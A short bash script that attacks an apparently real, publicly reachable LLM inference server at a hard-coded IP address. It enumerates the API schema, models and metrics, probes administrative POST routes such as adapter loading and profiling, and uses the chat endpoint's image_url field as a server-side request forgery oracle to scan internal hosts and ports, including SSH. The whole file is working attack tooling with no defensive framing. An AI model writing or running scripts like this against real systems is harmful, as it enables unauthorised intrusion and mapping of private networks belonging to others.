#!/bin/bash
B=http://123.184.7.135:8000
echo "=== openapi paths"
curl -s -m 15 "$B/openapi.json" -o /tmp/o.json -w 'o %{http_code} %{size_download}\n'
python3 -c "import json;d=json.load(open('/tmp/o.json'));print('\n'.join(sorted(d.get('paths',{}).keys())));print('INFO',json.dumps(d.get('info')))" 2>&1 | head -60
echo "=== models"
curl -s -m 10 "$B/v1/models" | head -c 500; echo
curl -s -m 10 "$B/metrics" | grep -iE 'vllm:.*(version|info)|python_info' | head -5
echo "=== POST routes"
for p in /v1/load_lora_adapter /v1/unload_lora_adapter /scale_elastic_ep /start_profile /stop_profile /tokenize /pooling /score /rerank; do
  c=$(curl -s -o /tmp/x -m 10 -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d '{}' "$B$p"); echo "POST $p -> $c $(head -c 140 /tmp/x|tr -d '\n')"
done
echo "=== ssrf oracle"
for t in 192.168.0.24:18086/health 192.168.0.24:18080/api/health 192.168.0.24:9400/metrics 192.168.0.22:14998/files 192.168.0.22:18000/docs 192.168.0.23:18081/ 192.168.0.23:22 192.168.0.31:22 192.168.0.31:781/ 192.168.0.20:18086/ 192.168.0.29:18086/ 192.168.0.1:80/ 10.0.0.1:80/ 127.0.0.1:8000/health; do
  r=$(curl -s -m 25 -o /tmp/y -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"model\":\"m\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"hi\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"http://$t\"}}]}],\"max_tokens\":1}" "$B/v1/chat/completions")
  echo "img http://$t -> $r $(head -c 130 /tmp/y|tr -d '\n')"
done
echo "=== 18081/18086 on 7.135"
for u in http://123.184.7.135:18081/ http://123.184.7.135:18086/ http://123.184.7.135:18080/api/health; do
  echo "-- $u -> $(curl -s -m 8 -o /tmp/z -w '%{http_code}' "$u") $(head -c 120 /tmp/z|tr -d '\n')"
done
echo DONE
